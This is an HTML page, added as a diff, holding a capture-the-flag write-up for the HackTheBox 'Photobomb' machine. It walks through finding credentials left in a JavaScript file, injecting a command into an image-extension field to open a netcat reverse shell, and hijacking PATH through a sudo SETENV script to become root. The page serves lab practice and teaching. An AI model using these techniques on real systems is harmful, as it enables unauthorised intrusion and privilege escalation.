@@ -1,0 +1,161 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Photobomb HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/photobomb.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Photobomb HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolution of the Photobomb machine from the HackTheBox platform" />
+<meta property="og:description" content="Resolution of the Photobomb machine from the HackTheBox platform" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Photobomb HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Photobomb HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolution of the Photobomb machine from the HackTheBox platform","headline":"Writeup Faculty HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Photobomb HackTheBox</h1>
+          <p>Resolution of the Photobomb machine from the HackTheBox platform</p>
+        </div>
+
+<div><p>We start by scanning the ports of the machine with nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.182
+Nmap scan report for 10.10.11.182
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>By doing a simple curl and looking at the headers we can see the domain photobomb.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s 10.10.11.182 -I | </span><span class="s2">grep</span><span class="p"> Location
+Location: </span><span class="kd">http://photobomb.htb</span>
+</code></pre></div></div>
+
+<div><p>Looking at the source code we find a custom js file</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>We see it from curl and find a url: <a href="http://pH0t0:b0Mb!@photobomb.htb/printer">http://pH0t0:b0Mb!@photobomb.htb/printer</a></p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">http://photobomb.htb/photobomb.js
+function init() {
+  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
+    document.getElementsByClassName('creds')[0].setAttribute('href','</span><span class="kd">http://pH0t0:b0Mb!@photobomb.htb/printer</span><span class="p">');
+  }
+}
+window.onload = init;</span>
+</code></pre></div></div>
+
+<div><p>Opening it authenticates us automatically, and we can see the following</p></div>
+<div><p><img src="./2.png"><p></div>
+
+  <div><p>At the bottom of the page we can download the image and change the extension to png</p></div>
+  <div><p><img src="./3.png"><p></div>
+  
+  <div><p>By intercepting the request we can see where it defines the extension</p></div>
+  <div><p><img src="./4.png"><p></div>
+  
+  <div><p>Imagining that it uses a binary to do the conversion, we can concatenate a command to it</p></div>
+  <div><p>So first we create a <a href="https://www.revshells.com/">reverse shell</a> with nc and mkfifo, url encoded</p></div>
+  <div><p><img src="./5.png"><p></div>
+  
+  <div><p>To concatenate the command after the png we add a ; and our payload</p></div>
+  <div><p><img src="./6.png"><p></div>
+  
+  <div><p>By pressing forward we receive the shell as a wizard and we can read the flag</p></div>
+  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+  <code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+  Listening on 0.0.0.0 443
+  Connection received on 10.10.11.182
+  </span><span class="s2">wizard@photobomb</span><span class="p">:</span><span class="na">~/photobomb</span><span class ="p">$id
+  uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
+  </span><span class="s2">wizard@photobomb</span><span class="p">:</span><span class="na">~/photobomb</span><span class ="p">$ hostname -I
+  10.10.11.182 dead:beef::250:56ff:feb9:240a
+  </span><span class="s2">wizard@photobomb</span><span class="p">:</span><span class="na">~/photobomb</span><span class ="p">$ cat ../user.txt
+  ****************************
+  </span><span class="s2">wizard@photobomb</span><span class="p">:</span><span class="na">~/photobomb</span><span class ="p">$</span>
+  </code></pre></div></div>
+  
+  <div><p>Looking at the sudoers we can see that we can run a script, but we also have the ability to set environment variables</p></div>
+  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+  <code><span class="s2">wizard@photobomb</span><span class="p">:</span><span class="na">~</span><span class="p ">$ sudo -l
+  Matching Defaults entries for wizard on photobomb:
+       secure_path=/usr/local/bin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+  
+  User wizard may run the following commands on photobomb:
+       (</span><span class="na">root</span><span class="p">) </span><span class="kd">SETENV</span><span class="p ">:NOPASSWD: </span><span class="kd">/opt/cleanup.sh</span><span class="p">
+  </span><span class="s2">wizard@photobomb</span><span class="p">:</span><span class="na">~</span><span class=" p">$</span>
+  </code></pre></div></div>
+  
+  <div><p>Looking at the script we can see that it uses find relatively and not the absolute path</p></div>
+  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+  <code><span class="s2">wizard@photobomb</span><span class="p">:</span><span class="na">~</span><span class="p ">$ cat /opt/cleanup.sh
+  #!/bin/bash
+  . /opt/.bashrc
+  cd /home/wizard/photobomb
+  
+  # clean up log files
+  if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
+  then
+     /bin/cat log/photobomb.log > log/photobomb.log.old
+     /usr/bin/truncate -s0 log/photobomb.log
+  fi
+  
+  # protect the priceless originals
+  </span><span class="kd">find</span><span class="p"> source_images -type f -name '*.jpg' -exec chown root:root {} \;
+  </span><span class="s2">wizard@photobomb</span><span class="p">:</span><span class="na">~</span><span class=" p">$</span>
+  </code></pre></div></div>
+  
+  <div><p>We can take advantage of the fact that we can change variables such as the path so that a custom find command takes us, and under the context of sudo our find will be executed as root</p></div>
+  
+  <div><p>For this we will create a find file that is worth bash and we will give it execute permissions</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wizard@photobomb</span><span class="p">:</span><span class="na">~</span><span class="p">$ echo bash > find
+</span><span class="s2">wizard@photobomb</span><span class="p">:</span><span class="na">~</span><span class="p">$ chmod +x find 
+</span><span class="s2">wizard@photobomb</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Now changing the path variable we execute the script and we get to be root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wizard@photobomb</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
+</span><span class="s2">root@photobomb</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@photobomb</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+10.10.11.182 dead:beef::250:56ff:feb9:240a 
+</span><span class="s2">root@photobomb</span><span class="p">:</span><span class="na">~</span><span class="p"># cat /root/root.txt 
+**************************
+</span><span class="s2">root@photobomb</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+
+<p><a href="./../../">Home</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
